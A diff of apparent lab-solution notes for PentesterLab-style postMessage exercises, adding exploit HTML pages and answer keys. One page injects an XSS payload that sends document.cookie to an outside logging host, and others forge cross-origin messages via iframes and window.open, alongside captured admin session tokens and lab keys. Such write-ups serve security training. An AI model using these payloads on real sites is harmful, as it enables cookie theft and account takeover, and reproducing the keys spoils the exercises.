@@ -1,5 +1,4 @@
 ## Orange Badge
-
 ### Intro to CSP 
 
 - https://hackerone.com/reports/153666
@@ -207,10 +206,103 @@ http://18.191.42.249/pm1.html
 ### postMessage() II
 
 - When you hit share `window.open("/key/0","ptlabdata0","height=200,width=150")`
+- In the new window you can check and `window.opener.postMessage('user=asdf&id=0')`
+- This will be received by the following code:
+
+```
+window.addEventListener("message", function(event){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "/share", true);
+    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+    xhr.send(event.data+"&_csrf=A3jSRZ07fPdkK-BkAhGpOYqb_YDte_4bAzyezFqV3IA");
+});
+```
+
+So we can create an iframe of the original page and send a postMessage to it as required:
+
+```
+<html>
+<body>
+
+<iframe onload="pm()" id="mf" src="http://ptl-01d9cedb-d27f26d5.libcurl.so/"></iframe>
+
+<script>
+function pm() {
+document.getElementById('mf').contentWindow.postMessage('user=asdf&id=0','*');
+}
+</script>
+
+</body>
+</html>
+```
+
+Solution
+
+```
+http://18.191.42.249/pm2.html
+Secret shared with you
+Name	Value
+PTLAB_KEY	88bcf066-e296-4f6a-9e33-e0eec4a77ec4
+```
+
+### postMessage() III
+
+- When you hit new to-do it opens `/add` using `window.open("/add","ptlabdata","height=200,width=150")`
+- Add page takes data from a textbox and sends it back using: `window.opener.postMessage(data, '*')`
+- Make sure to take cookie from the iframe and not the parent window.
 
 
+pm3.html
+```
+<html>
+<body>
+
+<script>
+function pm () {
+var payload = '<img src=x onerror=\'var xhttp = new XMLHttpRequest(); xhttp.open("GET", "http://18.191.42.249/log.php?c="+document.cookie, true); xhttp.send();\'>';
+document.getElementById('mf').contentWindow.postMessage(payload,'*');
+}
+</script>
+
+<iframe src="http://ptl-77dfd1d9-9173bd07.libcurl.so" id="mf" onload="pm()">
+
+</body>
+</html>
+```
+
+Solution
+```
+auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.8MO4_HYfCEr6pXYSqO3P4F4baNyHVt6KijsQAoim4-U
+put this as the cookie to log in as admin
+PTLAB_KEY=ba9fff91-4cb4-4702-bee9-1e1d409cfe9a
+```
 
 
+### postMessage() IV
 
+- When `X-Frame-Options: SAMEORIGIN` you can use window.
+- Add a little delay before sending the postmessage.
+
+pm4.html
+```
+<html>
+<body>  
+
+<script>
+var w = window.open('http://ptl-209d1a70-93b6f22e.libcurl.so');
+setTimeout(function() { w.postMessage('user=asdf&id=0','*'); }, 2000);
+</script>
+
+</body>
+</html>
+```
+
+Solution
+```
+Send to the vicim: http://18.191.42.249/pm4.html
+Secret shared with you
+Name	Value
+PTLAB_KEY	529083fc-5640-4741-a475-5f6e31188b3b
+```
 
 
